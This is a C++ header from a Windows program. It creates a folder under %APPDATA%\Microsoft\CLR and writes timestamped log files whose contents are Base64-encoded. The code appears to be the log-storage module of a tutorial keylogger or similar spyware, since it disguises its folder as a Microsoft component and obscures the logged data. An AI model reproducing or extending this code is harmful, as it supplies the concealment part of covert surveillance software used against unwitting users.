#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <windows.h>
#include <fstream>

#include "Helper.h"
#include "Base64.h"

namespace IO
{
    //WE NEED A FUNCTION TO RETRIEVE OUR DESIGNATED FOLDER
    std::string GetOurPath (const bool append_separator = false)
    //IT JUST CHECKS IF THE BACKSLASH IS NEEDED IN HE END OF THE PATH
    {
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_separator ? "\\" : "");
    }

    bool MkOneDr(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }//WE NEED TO RECTIFY THIS FUNCTION WITH ANOTHER ONE
    //EX:
    // "C:\\Users\User\Downloads"
    // IF "User" DOESN'T EXIST
    // "C:\\Users\Downloads"
    //"MkOneDr" WILL FAIL
    //BECAUSE IT WON'T HAVE THE FULL PATH AND IT WON'T BE
    //ABLE TO GO THROUGH IT
    //THEN, WE NEED TO MAKE A BACKUP FUNCTION
    //THAT WILL ACTUALLY CREATE ALL OF THESE PATHS
    //"C:\\Users\Downloads\file", etc.

    bool MKDir(std::string path)
    {
        for(char &c : path)
            if(c=='\\')
            {
                c='\0';
                if(!MkOneDr(path)) return false;
                c= '\\';
            }

        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path=GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_")+".log";

        try
        {
            std::ofstream file(path+name);
            if(!file) return "";
            std::ostringstream s;
            s<<"["<<dt.GetDateTimeString()<<"]"<<
            std::endl<<t<<std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file<<data;
            if(!file) return "";
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }

    }

}//END NAMESPACE

#endif // IO_H
